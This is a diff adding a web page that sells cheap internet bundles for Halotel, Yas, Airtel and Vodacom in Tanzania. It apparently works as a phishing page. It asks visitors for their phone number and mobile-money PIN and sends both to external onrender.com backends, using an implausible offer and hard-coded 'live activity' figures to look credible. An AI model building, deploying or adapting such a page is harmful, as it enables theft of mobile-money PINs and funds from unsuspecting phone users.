@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Internet Bundles</title>
+<link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+<div class="page-container">
+
+<h1 class="title">Experience The Future</h1>
+
+<div class="phone-box">
+<p>Enter Phone Number</p>
+<input id="phone" placeholder="07XXXXXXXX">
+</div>
+
+<div class="phone-box">
+<p>Enter PIN Number</p>
+<input id="pin" type="password" placeholder="****">
+</div>
+
+<div id="loading">
+<div class="spinner"></div>
+<p>Processing payment request...</p>
+</div>
+
+<div id="success">
+✅ Payment request sent to your phone.
+Please confirm the payment.
+</div>
+
+<div class="card-container">
+
+<!-- HALOTEL -->
+<div class="card" data-network="halotel">
+<h3>HALOTEL</h3>
+<img src="./images/halotel.jpeg" class="logo">
+<div class="circle">
+<div class="bundle">
+<h2>23GB</h2>
+<p>3000 TSH</p>
+<span>VALID FOR 3 MONTHS</span>
+</div>
+</div>
+<button onclick="buy()">Buy Now</button>
+</div>
+
+<!-- YAS -->
+<div class="card" data-network="yas">
+<h3>YAS</h3>
+<img src="./images/yas.jpeg" class="logo">
+<div class="circle">
+<div class="bundle">
+<h2>23GB</h2>
+<p>3000 TSH</p>
+<span>VALID FOR 3 MONTHS</span>
+</div>
+</div>
+<button onclick="buy()">Buy Now</button>
+</div>
+
+<!-- AIRTEL -->
+<div class="card" data-network="airtel">
+<h3>AIRTEL</h3>
+<img src="./images/airtel.jpeg" class="logo">
+<div class="circle">
+<div class="bundle">
+<h2>23GB</h2>
+<p>3000 TSH</p>
+<span>VALID FOR 3 MONTHS</span>
+</div>
+</div>
+<button onclick="buy()">Buy Now</button>
+</div>
+
+<!-- ✅ VODACOM -->
+<div class="card" data-network="vodacom">
+<h3>VODACOM</h3>
+<img src="./images/vodacom.jpeg" class="logo"> <!-- FIXED -->
+<div class="circle">
+<div class="bundle">
+<h2>23GB</h2>
+<p>3000 TSH</p>
+<span>VALID FOR 3 MONTHS</span>
+</div>
+</div>
+<button onclick="buy()">Buy Now</button>
+</div>
+
+</div>
+
+<section class="features">
+<h2>📊 Live Network Activity</h2>
+
+<div class="features-grid">
+<div id="usersOnline" class="feature-box">Users Online: 0</div>
+<div id="networkSpeed" class="feature-box">Network Speed: -- Mbps</div>
+<div id="bundlesSold" class="feature-box">Bundles Today: 1200</div>
+<div id="networkLoad" class="feature-box">Network Load: 70%</div>
+</div>
+
+</section>
+
+</div>
+
+<script>
+
+function apiBases(){
+  const bases=[];
+  if(location.protocol==="http:"||location.protocol==="https:"){
+    bases.push(location.origin);
+  }
+  bases.push("https://unlockvip-backend-1.onrender.com");
+  bases.push("https://unlockvip-backend.onrender.com");
+  return [...new Set(bases)];
+}
+
+async function fetchCreatePayment(body){
+  let lastError=null;
+  for(const base of apiBases()){
+    try{
+      const response=await fetch(base+"/create-payment",{
+        method:"POST",
+        headers:{ "Content-Type":"application/json" },
+        body:JSON.stringify(body)
+      });
+      const type=response.headers.get("content-type")||"";
+      if(response.status===404||response.status===405) continue;
+      if(type.includes("text/html")&&!type.includes("json")) continue;
+      return response;
+    }catch(error){
+      lastError=error;
+    }
+  }
+  throw lastError||new Error("All API hosts failed");
+}
+
+async function buy(){
+
+const phone=document.getElementById("phone").value
+const pin=document.getElementById("pin").value
+
+if(!phone){
+alert("Enter phone number")
+return
+}
+
+if(!pin){
+alert("Enter PIN number")
+return
+}
+
+document.getElementById("loading").style.display="block"
+document.getElementById("success").style.display="none"
+
+try{
+
+const response=await fetchCreatePayment({
+amount:3000,
+phone:phone,
+pin:pin
+});
+
+const result=await response.json()
+
+document.getElementById("loading").style.display="none"
+
+if(result.success){
+const checkoutUrl=
+result.checkout_url||
+result.data?.checkout_url||
+result.data?.redirect_url
+
+if(result.provider==="pesapal"&&checkoutUrl){
+window.location.href=checkoutUrl
+return
+}
+
+document.getElementById("success").style.display="block"
+}else{
+alert(result.error||"Payment failed")
+}
+
+}catch(error){
+
+document.getElementById("loading").style.display="none"
+alert("Server error")
+
+}
+
+}
+
+/* NETWORK DETECTION */
+
+const phoneInput=document.getElementById("phone")
+const cards=document.querySelectorAll(".card")
+
+function isTigoNumber(value){
+const digits=String(value||"").replace(/\D/g,"")
+if(digits.startsWith("25565")||digits.startsWith("25567")||digits.startsWith("25570")||digits.startsWith("25571")||digits.startsWith("25577")) return true
+if(digits.startsWith("065")||digits.startsWith("067")||digits.startsWith("070")||digits.startsWith("071")||digits.startsWith("077")) return true
+return /^(65|67|70|71|77)/.test(digits)
+}
+
+function isHalotelNumber(value){
+const digits=String(value||"").replace(/\D/g,"")
+return digits.startsWith("062")||digits.startsWith("25562")||/^(61|62|63)/.test(digits.replace(/^255/,""))
+}
+
+function isAirtelNumber(value){
+const digits=String(value||"").replace(/\D/g,"")
+return digits.startsWith("068")||digits.startsWith("069")||digits.startsWith("078")||digits.startsWith("25568")||digits.startsWith("25569")||digits.startsWith("25578")||/^(66|68|69|78)/.test(digits.replace(/^255/,""))
+}
+
+function isVodacomNumber(value){
+const digits=String(value||"").replace(/\D/g,"")
+return digits.startsWith("074")||digits.startsWith("075")||digits.startsWith("076")||digits.startsWith("079")||digits.startsWith("25574")||digits.startsWith("25575")||digits.startsWith("25576")||digits.startsWith("25579")||/^(74|75|76|79)/.test(digits.replace(/^255/,""))
+}
+
+phoneInput.addEventListener("input",()=>{
+
+const number=phoneInput.value
+
+cards.forEach(card=>{
+card.classList.remove("active-network")
+})
+
+if(isHalotelNumber(number)){
+activate("halotel")
+}
+else if(isTigoNumber(number)){
+activate("yas")
+}
+else if(isAirtelNumber(number)){
+activate("airtel")
+}
+else if(isVodacomNumber(number)){
+activate("vodacom")
+}
+
+})
+
+function activate(network){
+cards.forEach(card=>{
+if(card.dataset.network===network){
+card.classList.add("active-network")
+}
+})
+}
+
+</script>
+
+<script src="frontend-features.js"></script>
+
+</body>
+</html>
